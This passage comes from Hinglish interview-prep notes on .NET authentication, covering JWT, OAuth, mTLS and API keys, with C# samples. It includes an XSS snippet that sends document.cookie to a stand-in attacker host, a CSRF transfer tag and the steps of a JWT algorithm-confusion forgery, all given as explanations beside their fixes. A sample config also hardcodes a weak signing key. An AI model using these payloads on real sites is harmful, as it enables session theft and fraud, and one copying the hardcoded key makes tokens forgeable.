1. Server ki public RSA key le lo (jo, design se, publicly available hai — jaise ek JWKS endpoint se).
2. `alg: HS256` ke saath ek token craft karo aur **public key ke raw bytes ko HMAC secret ke roop mein use karo**.
3. Kyunki server (agar misconfigured hai) verification paths dono ke liye same key material lookup use karta hai aur decide karne ke liye ki *kaise* key use karni hai token ke apne `alg` header ko trust karta hai, wo end up karta hai ek HMAC compute karne mein ek "secret" ke saath jo attacker ke paas bhi hai (public key) — aur forged signature verify ho jaati hai.

**Fix:** verifier ko expected algorithm *aur* algorithm family ko server-side fix karna chahiye, incoming token ke header se independent, aur kabhi bhi same key material ko symmetric aur asymmetric verification paths ke beech interchangeably use nahi karna chahiye. Modern libraries (`Microsoft.IdentityModel.Tokens` .NET mein) ise by default mitigate karti hain jab tak aap manually algorithm restriction disable nahi karte, lekin interview mein explicitly yeh kehna worth hai ki yeh ek **configuration discipline** problem hai, kuch aisa nahi jo library alone guarantee kare — hamesha explicitly algorithm restriction set karo instead of defaults ko blindly trust karne ke.

```csharp
// Explicit, safe configuration — do not rely on implicit defaults
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey, // RSA public key
    ValidAlgorithms = new[] { SecurityAlgorithms.RsaSha256 }, // pin explicitly — reject HS256/none
    ValidateIssuer = true,
    ValidateAudience = true,
    ValidateLifetime = true,
    ClockSkew = TimeSpan.FromMinutes(2)
};
```

**Interviewer follow-up:** *"Aap ise code review mein kaise detect karoge?"* — Kisi bhi JWT verification code ko dekho jo algorithm ko token se read karta hai decide karne ke liye ki kaise verify karna hai, koi bhi code path jo ek hi key object HMAC aur RSA verification dono ke liye use karta hai, aur koi bhi explicit disabling of algorithm validation "library ko kaam karne ke liye."

### 4.4 CSRF, XSS, aur Session Fixation — Yeh Auth ke Saath Kaise Interact Karte Hain

**XSS (Cross-Site Scripting)** — ek attacker malicious JavaScript ko ek trusted site mein inject karta hai, jo phir kisi dusre user ke browser mein execute hota hai, *us user* ke browser context ko use karke data/tokens steal karne ya unke roop mein actions perform karne ke liye.

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**CSRF (Cross-Site Request Forgery)** — ek malicious site ek logged-in user ke browser ko trick karta hai ek unwanted request bhejne ke liye ek trusted site ko. Kyunki browsers automatically cookies attach karte hain, target server ko lagta hai ki yeh ek legitimate authenticated request hai.

```html
<!-- On evil.com, while you're logged into bank.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```
Aapka browser automatically `bank.com` session cookie attach kar deta hai; bank ko ek valid cookie dikhti hai aur wo transfer process kar deta hai aapki knowledge ke bina.

**Yeh token storage choices ke saath kaise interact karte hain:**

| Storage | XSS risk | CSRF risk | Mitigation chahiye |
|---|---|---|---|
| `localStorage`/`sessionStorage` | High (JS-readable) | None (auto-attach nahi hota) | Strong CSP, no unsanitized HTML injection |
| HttpOnly cookie | Low (JS read nahi kar sakta) | Present (browser dwara auto-attached) | `SameSite=Strict/Lax` (same-site) ya `SameSite=None; Secure` + CSRF token (cross-site), anti-forgery tokens |

**[new content] Session fixation** — source notes mein bilkul mention nahi hai, lekin ek classic auth-adjacent vulnerability jo cold janna zaruri hai: ek attacker victim par ek *known* session identifier force karta hai (jaise unhe ek link bhej ke jisme pre-set session ID ho, ya ek server exploit karke jo URL/query string se session IDs accept karta hai) victim ke login karne *se pehle*. Agar server login successful hone par ek **fresh** session identifier issue nahi karta, attacker ka pre-known session ID valid ho jaata hai jaise hi victim login karta hai — attacker simply same ID use karke ab-authenticated session ride karta hai. **Mitigation:** hamesha session identifier ko regenerate karo (ya, JWT/cookie world mein, ek brand-new token issue karo) successful login ke immediately baad, kabhi bhi session/token identifier URL se accept mat karo, aur sessions ko kisi aisi cheez se bind karo jo attacker set nahi kar sakta (server-generated, cryptographically random, HttpOnly).

**Interview-ready synthesis:** yeh teen attacks same problem ke different layers target karte hain — XSS credentials/tokens ki *storage* attack karta hai, CSRF *ambient trust* attack karta hai jo browsers cookies mein rakhte hain, aur session fixation session identifiers ke *lifecycle* ko attack karta hai. Ek robust auth design ko har ek ke liye ek mitigation chahiye: XSS ke liye CSP/sanitization, CSRF ke liye SameSite + anti-forgery tokens, aur fixation ke liye session/token regeneration on privilege change. Sirf HttpOnly cookies par rely karna XSS-token-theft solve karta hai lekin explicitly CSRF protection ki zarurat reintroduce karta hai — yahi exactly wo trade-off hai jo aapke source notes cookie-vs-header dual-mode architecture mein flag karte hain.

### 4.5 [new content] mTLS for Service-to-Service Auth

Source notes se absent (jo "Mutual TLS for service identity" ko microservices security ke neeche ek single bullet ke roop mein mention karte hain bina explanation ke) — expand karna worth hai kyunki yeh internal service-to-service traffic securing par ek common senior/lead follow-up hai.

**Mutual TLS (mTLS):** normal TLS mein, sirf *server* ek certificate presents karta hai aur client use verify karta hai. mTLS mein, **client bhi ek certificate presents karta hai**, aur server use verify karta hai — dono sides ek-dusre ko cryptographically authenticate karte hain TLS handshake ke part ke roop mein, koi bhi application-layer request/token bhejne se pehle.

- **Service-to-service auth ke liye kyun use karo:** yeh *calling service* ko transport layer par authenticate karta hai, kisi bhi bearer token se independent — zero-trust internal networks (jaise Istio/Linkerd jaisa service mesh) mein useful hai jahan aap chahte ho ki har hop cryptographically verify ho, sirf "network presumably private hai" na ho.
- **Trade-offs bearer tokens (JWT/OAuth client credentials) ke against:**
  - mTLS certificates ko issuance/rotation infrastructure chahiye (aksar ek service mesh sidecar ise transparently handle karta hai) — ek client secret rotate karne se heavier operational lift.
  - mTLS *service* ko authenticate karta hai, fine-grained scopes/claims ko nahi *kya* karne ki permission hai — aapko typically OAuth client credentials ya ek custom claims model upar layer karna padta hai authorization decisions ke liye.
  - Practice mein bahut common combination: **transport-level service identity ke liye mTLS + authorization claims ke liye OAuth client credentials (JWT)** — defense in depth, either/or nahi.
- **.NET angle:** Kestrel client certificate validation support karta hai (`RequireCertificate`/`AllowCertificate` `HttpsConnectionAdapterOptions` mein); most production mTLS setups actual handshake/rotation ko ek service mesh ya API gateway ko delegate karte hain instead of application code mein certificate validation hand-roll karne ke.

### 4.6 [new content] API Keys vs OAuth Client Credentials for Machine-to-Machine

Source notes se bhi absent, lekin ek frequent real-world design question: "ek partner hamari API call karna chahta hai — hum unhe API key dein ya OAuth setup karein?"

| | API Key | OAuth 2.0 Client Credentials |
|---|---|---|
| Kya prove karta hai | "Caller ke paas yeh static secret hai" | "Caller ek specific registered client ke roop mein authenticate hua aur usse ek scoped, time-limited token issue hua" |
| Expiry | Usually koi nahi (manually rotate hone tak) | Built-in — access tokens design se short-lived hote hain |
| Scoping | Typically per key all-or-nothing, jab tak aap custom scope logic na banao | Per client scopes ka native support |
| Revocation | Manual (key delete/rotate karo) | Client/token level par revoke; short expiry exposure automatically limit karti hai |
| Standardization | Koi standard protocol nahi — per API bespoke | Standardized (RFC 6749) — client libraries, tooling, aur audits sab ise samajhte hain |
| Operational simplicity | Implement aur consume karna bahut simple | Zyada moving parts (token endpoint, JWKS, expiry handling) |
| Best for | Simple, low-risk integrations, quick partner onboarding, rate-limiting/identification security boundary se zyada | Koi bhi M2M scenario jahan aapko real security guarantees, auditability, scoped/least-privilege access, aur standardized tooling chahiye |

**Senior framing:** API keys ko ek *identification* mechanism (kaun mujhe call kar raha hai) ke roop mein sochna best hai instead of ek real *authorization* mechanism (proving karna ki wo kya karne ki allowed hain, automatic expiry ke saath) — yeh low-stakes, low-blast-radius integrations ke liye fine hain, lekin kisi bhi security-sensitive cheez ke liye, OAuth 2.0 Client Credentials (private key JWT ya client secret ke saath, short-lived tokens, aur defined scopes) modern default hai, aur yahi hai jo zyada cloud providers (Azure AD app registrations client credentials flow ke saath, Auth0 M2M applications) aapko by default push karte hain.

### 4.7 Performance Considerations

- **JWT per request DB/session lookup avoid karta hai** — yeh server-side sessions ke upar JWT ka core performance win hai, lekin free nahi hai: RS256/ES256 signatures verify karna HS256 se zyada CPU-intensive hai, aur revocation ke liye har mitigation (blacklist check, token versioning, introspection call) per request kuch form ki I/O reintroduce karta hai, jo us win ko erode karta hai.
- **Large token payloads har single request par network overhead badhaate hain** (unlike ek session cookie, jo small aur constant-size hoti hai) — claims minimal rakho; kam-needed user detail ko ek API se fetch karo instead of embed karne ke.
- **JWKS caching:** verifiers ko JWKS response cache karna chahiye (`Cache-Control` respect karte hue) instead of har request par fetch karne ke; zyada libraries (`Microsoft.IdentityModel.Protocols.OpenIdConnect`) yeh automatically karti hain jab aap `Authority` set karte ho, lekin yeh janna worth hai ki yeh ho raha hai aur tunable hai.
- **Introspection calls (opaque tokens)** us model ka single biggest latency cost hain — short-TTL local caching of introspection results se mitigate kiya jaata hai, kuch revocation immediacy ko throughput ke liye trade karte hue.
- **Clock skew tolerance** chhota hona chahiye (1–2 minutes) — bahut generous skew window silently expired tokens ki effective validity extend karti hai; bahut strict hone se distributed servers ke minor clock drift se spurious failures hoti hain.

---

## 5. Best Practices

- **Kabhi JWT mein secrets mat rakho** — no passwords, no financial data, no PII jise aap intercept hone par expose nahi chahte, encrypted bhi nahi (assume karo ki logs/telemetry pipeline mein kabhi plaintext leak kar sakti hai).
- **Access tokens short-lived rakho** — minutes, hours ya days nahi.
- **Hamesha `iss`/`aud`/`exp`/`nbf` validate karo** — `aud` validation skip karna ek bahut common mistake hai jo issuer share karne wale services ke across token replay enable karta hai.
- **Asymmetric signing use karo (RS256/ES256) jab multiple services tokens validate karte hain** — HMAC secret har jagah share karne se safer key distribution.
- **Ek dedicated token-type claim use karo** (`"typ": "access"` / `"token_use": "access"`) taaki ek refresh token kabhi access token ke roop mein replay na ho.
- **Roles ko frequently change hone par access tokens mein directly embed karne se scopes prefer karo** — role changes tab tak effect nahi lenge jab tak token expire na ho jaaye jab tak aap state checks na add karo; scopes issuance time par capability describe karte hain aur inherently zyada stable hain.
- **Signing keys rotate karo** — multiple keys maintain karo, `kid` use karo, JWKS ke through public keys publish karo, periodically rotate karo, purani keys available rakho jab tak unse signed saare tokens expire na ho jaayein.
- **Clock skew handle karo** — 1–2 minutes allow karo, zyada nahi.
- **Hamesha HTTPS use karo** — token sniffing aur downgrade-based replay prevent karta hai.
- **Tokens ko kabhi query string mein mat bhejo** — yeh server logs aur browser history mein leak ho jaate hain.
- **Har use par refresh tokens rotate karo, aur reuse detect karo** ([3.8](#38-new-content-refresh-token-rotation--reuse-detection) dekho).
- **Logout aur credential/password change par revoke karo**, sirf explicit "revoke" action par nahi.
- **Refresh/token endpoint ko rate-limit karo** — yeh brute force aur abuse ke liye ek high-value target hai.
- **Policy-based authorization ko scattered role checks se prefer karo** kisi bhi trivial app se zyada ke liye — actual access-control logic ko centralize aur auditable banata hai.
- **Secrets (signing keys, client secrets) ko ek managed secret store mein store karo** (Azure Key Vault, AWS Secrets Manager) — source control mein commit hone wale `appsettings.json` mein kabhi nahi.

---

## 6. Common Pitfalls

### 6.1 JWT Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | Long token expiry | Stolen tokens lambe window ke liye valid rehte hain; immediate revocation nahi | Access token expiry 5–30 minutes; refresh tokens use karo |
| 2 | No revocation strategy | Logout se access immediately invalid nahi hota | Blacklist (Redis), refresh-token revocation, short lifetime |
| 3 | Insecure storage (`localStorage`) | XSS token ko wholesale steal kar sakta hai | HttpOnly Secure cookies, ya BFF pattern |
| 4 | Large payloads | Network overhead, slower requests | Sirf essential claims rakho; extra data API se fetch karo |
| 5 | Validation checks skip karna (issuer/audience/expiry) | Forged/expired/misdirected tokens accept ho jaate hain | Hamesha `iss`, `aud`, `exp`, `nbf`, signature validate karo |
| 6 | Weak signing keys | Tokens forge ho sakte hain | Strong secrets ya RSA/ECDSA keys; regularly rotate karo |
| 7 | Clock skew misconfiguration | Random, hard-to-reproduce auth failures | Minimal skew tolerance (1–2 minutes) |
| 8 | JWT ko query string mein bhejna | Token logs/browser history se leak hota hai | Hamesha `Authorization` header use karo |
| 9 | No HTTPS enforcement | Tokens interceptable, replay enable karta hai | HTTPS everywhere enforce karo |
| 10 | Assuming JWT is encrypted | Payload kisi bhi token holder ko readable hai | Public treat karo — kabhi secrets embed mat karo |

### 6.2 OAuth Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | SPAs ke liye implicit flow use karna | Token leakage risk (URL/history mein exposed) | Authorization Code + PKCE |
| 2 | Improper/wildcard redirect URI validation | Token/code hijacking | Strict, exact redirect URI allow-listing |
| 3 | Frontend code mein client secrets store karna | Koi bhi client ko impersonate kar sakta hai | JS/mobile bundles mein secrets kabhi embed mat karo; public clients ke liye PKCE use karo |
| 4 | Over-permissioned scopes | Token leak hone par excessive access | Least-privilege scopes |
| 5 | API mein missing token validation | Blind trust ke through unauthorized access | Hamesha issuer, audience, expiry, signature validate karo |
| 6 | No refresh token rotation | Replay attacks enable karta hai | Har use par rotate karo |
| 7 | Poor revocation strategy | Stolen refresh tokens indefinitely valid rehte hain | Ek revocation mechanism maintain karo |
| 8 | OAuth ko authentication se confuse karna | Wrong implementation assumptions, missing identity guarantees | Authentication ke liye OpenID Connect use karo, delegated authorization ke liye OAuth |

### 6.3 Refresh Token Pitfalls

| # | Pitfall | Impact | Best Practice |
|---|---|---|---|
| 1 | Insecure storage (localStorage/sessionStorage/plain cookie) | XSS-driven account takeover | HttpOnly Secure cookies; server-side store hone par at rest encrypt karo |
| 2 | No rotation | Stolen token indefinite access-token minting deta hai | Har refresh par rotate karo |
| 3 | Long expiry (months) | Compromise hone par wide attack window | 7–30 days typical; periodic re-login force karo |
| 4 | User/device se bound nahi | Attacker ke device se token replay | Feasible hone par device fingerprint/session id se bind karo |
| 5 | Logout/password change par no revocation | Token post-logout valid rehta hai | Dono events par explicitly revoke karo |
| 6 | Unlimited active tokens per user | Compromise track karna hard; session sprawl | Active sessions cap karo; ek token inventory maintain karo |
| 7 | No replay detection | Silent, ongoing account compromise | Ek rotated token ka reuse detect karo; whole family revoke karo ([3.8](#38-new-content-refresh-token-rotation--reuse-detection) dekho) |
| 8 | Refresh endpoint rate-limited nahi | Brute-force/guessing exposure | Rate limit aur monitor karo |
| 9 | Query string se sent | Logs/browser history se leak hota hai | Body ya secure cookie only |
| 10 | No audit logging of refresh activity | Attacks unnoticed rehte hain | Anomalies ke liye log aur monitor karo |

---

## 7. Implementation Reference (C#)

.NET 8 ke liye minimal, idiomatic JWT bearer setup (source examples se consolidate kiya gaya — secrets illustration ke liye inline dikhaye gaye hain; **production mein ek managed secret store use karo**).

**`appsettings.json`:**
```json
{
  "Jwt": {
    "Key": "SUPER_SECRET_KEY_12345",
    "Issuer": "MyCompany.Auth",
    "Audience": "MyCompany.Api",
    "ExpiryMinutes": 30
  }
}
```

**`Program.cs`:**
```csharp
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

var builder = WebApplication.CreateBuilder(args);

var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"],
            ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small, deliberate skew — not TimeSpan.Zero in most real systems
        };
    });

builder.Services.AddAuthorization();
builder.Services.AddControllers();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Token generator service:**
```csharp
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

public class JwtTokenService
{
    private readonly IConfiguration _config;

    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateToken(string userId, string email, string role)
    {
        var jwtSettings = _config.GetSection("Jwt");
        var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(ClaimTypes.Email, email),
            new(ClaimTypes.Role, role),
            new("token_use", "access") // dedicated type claim — prevents refresh/access confusion
        };

        var credentials = new SigningCredentials(
            new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"],
            audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
            signingCredentials: credentials);

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

**Dual-mode auth: browsers ke liye cookie, Postman/mobile ke liye header.** Yeh aapke notes ke ek real constraint ko explicitly solve karta hai: HttpOnly cookies (browser XSS protection ke liye right choice) non-browser clients jaise Postman ya native mobile apps ko invisible hote hain, jo naturally `Authorization` header use karte hain instead. Dono ko ek backend se support karna:

```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();

    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");

    // Browser support
    Response.Cookies.Append("access_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30)
    });

    // Postman/mobile support
    return Ok(new { access_token = token });
}
```

```csharp
.AddJwtBearer(options =>
{
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Priority 1: Authorization header (Postman/mobile)
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
            {
                context.Token = authHeader["Bearer ".Length..];
            }
            // Priority 2: cookie (browser)
            else if (context.Request.Cookies.TryGetValue("access_token", out var cookieToken))
            {
                context.Token = cookieToken;
            }
            return Task.CompletedTask;
        }
    };
});
```

Controllers ko doonon tarah ke liye koi special handling nahi chahiye:
```csharp
[Authorize]
[HttpGet("orders")]
public IActionResult GetOrders() => Ok("Secure Data");
```

**Production settings checklist (source notes se):**
- HTTPS hamesha enforced.
- CORS browser cookie flow ke liye credentials allow karne ke liye configured.
- `SameSite`: same-domain ke liye `Strict`/`Lax`; cross-domain SPA scenarios ke liye `None; Secure`.
- Jab bhi cookies involve hon CSRF protection required.
- Access token expiry 10–30 minutes; seamless re-auth ke liye refresh token.

**Refresh endpoint (concept, rotation ke saath):**
```csharp
[HttpPost("refresh")]
public IActionResult RefreshToken(RefreshRequest request)
{
    var savedToken = _refreshTokenStore.Get(request.RefreshToken);

    if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed)
    {
        // IsConsumed = true → reuse of an already-rotated token: possible theft.
        if (savedToken?.IsConsumed == true)
            _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
        return Unauthorized();
    }

    var newAccessToken = _jwtService.GenerateToken(savedToken.UserId, savedToken.Email, savedToken.Role);
    var newRefreshToken = Guid.NewGuid().ToString();

    _refreshTokenStore.MarkConsumedAndIssueNext(request.RefreshToken, newRefreshToken);

    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });
}
```

**Policy-based authorization:**
```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

---

## 8. Sample Interview Q&A

**Q1. JWT validation internally kaise kaam karta hai?**
Token ko `Authorization` header (ya cookie) se extract karo. Correct key select karo (`kid` se ek trusted JWKS se agar asymmetric hai). Signature ko ek *server-configured* algorithm use karke verify karo (kabhi token ke apne `alg` claim se nahi). `exp`, `nbf`, `iss`, `aud` ko small clock-skew tolerance ke saath validate karo. Claims ko `HttpContext.User` mein extract karo. Sirf tab authorization stage roles/policies evaluate karta hai. Kisi bhi failure par reject karo.

**Q2. Authentication aur Authorization mein difference?**
Authentication answer karta hai "aap kaun ho" (login process; JWT/cookie identity validate karta hai). Authorization answer karta hai "aap kya kar sakte ho" (claims/roles/policies ek specific resource ke access ko validate karte hain). Failure modes bhi different hain: authentication failure → 401; authorization failure → 403.

**Q3. Basic Authentication insecure kyun hai?**
Credentials har request par travel karte hain, Base64 encoding hai encryption nahi, koi expiration ya revocation nahi hai, aur ek captured request replay ho sakti hai. Yeh abhi bhi legacy/internal systems mein purely compatibility ke liye use hoti hai, hamesha mandatorily HTTPS ke over.

**Q4. Aap JWT tokens revoke kaise karte ho?**
JWT stateless hai, isliye revocation native nahi hai — aap state add karte ho: short-lived access tokens (primary strategy), Redis mein ek `jti` blacklist, token versioning, refresh-token revocation, ya signing-key rotation ek nuclear option ke roop mein. Har ek kuch server-side state/lookup reintroduce karta hai, jo JWT ke original statelessness ke against fundamental trade-off hai.

**Q5. JWT aur OAuth mein difference?**
JWT ek token *format* hai; OAuth 2.0 ek *authorization framework* hai kaise ek client tokens obtain aur use karta hai kisi user ke behalf par resources access karne ke liye. OAuth commonly JWT ko apne access/ID token format ke roop mein use karta hai, lekin yeh different problems solve karte hain aur interchangeable concepts nahi hain.

**Q6. Windows Authentication kab use karna chahiye?**
Internal enterprise apps jo ek Active Directory domain ke andar SSO chahti hain; public internet-facing APIs ke liye suitable nahi (no cross-domain/external client support, aapko Kerberos/NTLM infrastructure se tie karta hai).

**Q7. Aap microservices communication kaise secure karte ho?**
Services ke beech JWT (aksar ek service-specific `aud` ke saath), transport-level service identity ke liye mutual TLS, API gateway-level validation, aur network isolation — typically combined (mTLS + JWT), either/or nahi ([4.5](#45-new-content-mtls-for-service-to-service-auth) dekho).

**Q8. Claims vs Roles — kaunsa better hai?**
Claims fine-grained, scalable access control provide karte hain; roles coarse hote hain aur requirements narrow hone par combinatorially multiply karte hain. Production mein, claims (aur roles jahan appropriate ho) se build kiya gaya policy-based authorization recommended default hai kyunki yeh decision logic ko centralize karta hai.

**Q9. Aap token expiration kaise handle karte ho?**
Short-lived access tokens, naye obtain karne ke liye ek refresh-token flow, aur frontend par silent refresh (interceptor pattern) taaki user experience re-login se interrupt na ho.

**Q10. Aap token replay attacks kaise prevent karte ho?**
HTTPS everywhere, short token lifetime, secret/key rotation, feasible hone par device binding, aur critical operations (payments, state-changing actions) ke liye nonce/idempotency-key tracking regardless of token validity.

**Q11. [new content] PKCE ab confidential clients ke liye bhi kyun recommended hai, sirf public ones jaise SPAs ke liye nahi?**
PKCE public clients ko protect karne ke liye design hua tha jo ek secret hold nahi kar sakte, lekin yeh redirect step par authorization-code interception se bhi defend karta hai regardless of client type, aur ise universally use karna configuration guidance simplify karta hai ("always use PKCE" vs ek conditional rule), koi real operational cost ke bina. [3.3](#33-pkce--why-its-now-mandatory-even-for-confidential-clients) dekho.

**Q12. [new content] JWT par ek algorithm confusion attack walk-through karo.**
Agar ek server RS256 tokens ko public key se verify karta hai lekin uski library same key-lookup path use karke HS256 bhi accept karti hai, ek attacker ek HS256 token craft kar sakta hai aur (publicly available) RSA public key bytes ko HMAC secret ke roop mein use kar sakta hai — ek signature produce karte hue jise server incorrectly accept kar leta hai. Mitigation: expected algorithm(s) server-side pin karo, kabhi token ke apne `alg` header ko trust mat karo, kabhi symmetric/asymmetric verification paths ke across key material share mat karo. [4.3](#43-new-content-jwt-validation-pitfalls-algorithm-confusion--algnone) dekho.

**Q13. [new content] BFF pattern kya hai aur SPA ke liye token-in-browser approach ke upar aap ise kyun use karoge?**
Backend-for-Frontend: SPA sirf apne backend ke saath ek plain session cookie hold karta hai, jo OAuth dance server-side perform karta hai aur kabhi browser ko koi OAuth/JWT token expose nahi karta. Yeh "JS mein token safely kahan store karun" problem ko poori tarah remove kar deta hai, ek extra backend component ki cost par. [3.9](#39-new-content-securing-spa-to-api-auth-bff-pattern-vs-token-in-browser) dekho.

**Q14. [new content] Aap refresh token reuse detection kaise design karoge?**
Har refresh token ko use ke baad "consumed" mark karo (delete karne ke bajaye) instead of sirf replace karne ke. Agar ek consumed token phir se present kiya jaata hai, ise theft ka signal treat karo aur poori token family revoke karo, full re-authentication force karte hue — chahe yeh legitimate user ko bhi logout kar de, yeh safer failure mode hai. [3.8](#38-new-content-refresh-token-rotation--reuse-detection) dekho.

---

## Summary of Additions

Naye `[new content]` sections add kiye gaye kyunki yeh commonly ek senior .NET interview level par probe hote hain aur original notes mein missing the ya sirf unexplained one-liners ke roop mein mention the:

- **2.7 The 7 ASP.NET Core Authorization Styles** — original notes ne sirf 7 items list kiye the bina explanation ke; har ek ko definitions aur examples ke saath expand kiya, resource-based authorization sahit, jo data-dependent access rules ka mechanism hai.
- **3.2 OAuth2 Grant Types: Which Are Deprecated/Unsafe** — poore grant-type landscape ko clarify karta hai aur explicitly Implicit aur ROPC ko OAuth 2.1 mein deprecated/removed flag karta hai, ek frequent interview trap.
- **3.5 SAML vs OIDC for SSO/Federation** — bilkul cover nahi kiya gaya tha; enterprise/lead roles ke liye essential jo legacy IdP integrations ko modern OIDC ke saath touch karte hain.
- **3.8 Refresh Token Rotation & Reuse Detection** — notes ne rotation ko ek pitfall ke roop mein naam diya lekin reuse detection kabhi explain nahi kiya, woh mechanism jo actually rotation ko ek real security control banata hai.
- **3.9 Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser** — current OAuth BCP-recommended architecture ko naam deta hai aur contrast karta hai cookie/header dual-mode design ke against jo notes depth mein describe karte hain.
- **3.10 ASP.NET Core Identity Customization** — bilkul absent; critical kyunki zyada real .NET systems Identity par build karte hain instead of user management hand-roll karne ke.
- **3.11 Multi-Tenant Authentication & Authorization** — bilkul absent; ek near-guaranteed SaaS/senior topic (tenant claim design, per-tenant issuers, cross-tenant leakage prevention).
- **4.2 Opaque Tokens vs JWT for Revocation — the Real Trade-off** — ek existing bullet ko us fundamental latency-vs-revocability architectural decision ke roop mein reframe karta hai jo yeh actually hai.
- **4.3 JWT Validation Pitfalls: Algorithm Confusion & alg:none** — notes ne ise ek sentence tak reduce kar diya tha; actual attack mechanics aur concrete mitigation ke saath expand kiya, kyunki "yeh attack explain karo" ek common follow-up hai.
- **4.4 (session fixation addition)** — session fixation bilkul mention nahi hua tha; existing CSRF/XSS explanations ke saath add kiya kyunki teenon standard trio of auth-adjacent web attacks hain.
- **4.5 mTLS for Service-to-Service Auth** — notes mein ek single unexplained bullet tha ("Mutual TLS for service identity"); .NET-specific notes ke saath ek full explanation mein expand kiya.
- **4.6 API Keys vs OAuth Client Credentials for Machine-to-Machine** — bilkul absent; partner/service integrations ke liye ek bahut common real-world design question.
- **Q11–Q14 in Sample Interview Q&A** — naye gap topics ko directly interview-answer format mein answer karne ke liye add kiye gaye.

**Consolidation ke dauraan flag ki gayi contradictions:**
- Access token lifetime guidance source sections ke across vary karti thi (ek jagah 5–15 min, dusri jagah 5–30 min, 10–30 min, aur 15–60 min). Zyada conservative senior-level guidance rakhi (5–30 minutes, 5–15 tighter/preferred end ke saath), aur range ko note kiya instead of ek number ko absolute choose karne ke, kyunki real systems risk tolerance se vary karte hain.
- Ek code sample set `ClockSkew = TimeSpan.Zero` karta tha jab ki prose kahin aur 1–2 minutes ka skew allow karne ki recommend karta tha. Implementation reference mein flag kiya aur illustrative code ko `TimeSpan.FromMinutes(2)` mein change kiya (more correct) prose guidance se match karne ke liye, kyunki `TimeSpan.Zero` notes ki apni stated best practice ke against contradict karta hai aur exactly "random clock-skew auth failures" pitfall cause karta hai jise notes separately warn karte hain.

---

## Summary of [gaps] Additions (This Pass)

Naye `[gaps]` sections is second pass mein add kiye gaye, jo topics cover karte hain jo current (2025/2026) senior .NET interviews mein increasingly probe hote hain jab passwordless auth aur bearer-token hardening "emerging" se "expected knowledge" ki taraf move ho rahe hain:

- **3.12 WebAuthn / FIDO2 / Passkeys** — original notes aur pehle `[new content]` pass se bilkul absent. Passkeys Apple, Google, aur Microsoft platforms ke across default passwordless recommendation ban gaye hain, aur enterprise IdPs (Azure AD/Entra ID, Okta) native support roll out kar rahe hain. Interviewers is topic ko use karte hain check karne ke liye ki kya candidate samajhta hai *kyun* yeh phishing-resistant hai (origin-bound cryptographic signatures, koi shared secret nahi jo steal ya mistype into a phishing site ho) instead of sirf buzzword janne ke — OTP-based MFA se ek meaningful step up, jo real-time phishing proxies ke liye vulnerable rehta hai.
- **3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession)** — original notes se bilkul absent. Directly ek fundamental weakness ko address karta hai jo already [4.1](#41-why-jwt-revocation-is-hard--and-the-real-strategies) aur [4.2](#42-new-content-opaque-tokens-vs-jwt-for-revocation--the-real-trade-off) mein discuss ki gayi hai (ek bearer token, steal hone ke baad, attacker dwara fully usable hai) bina mTLS ([4.5](#45-new-content-mtls-for-service-to-service-auth)) ki heavier certificate infrastructure chahiye ke. Jaise DPoP adoption modern OAuth/OIDC providers mein badhti hai, yeh ek increasingly likely follow-up hai jab bhi ek candidate "just use short-lived JWTs" bolta hai token theft ka apna complete answer ke roop mein.
- Koi aur substantive factual contradictions nahi mile — notes largely multiple source passes ke across same core JWT/OAuth concepts ke consistent repeats/rephrasings hain.
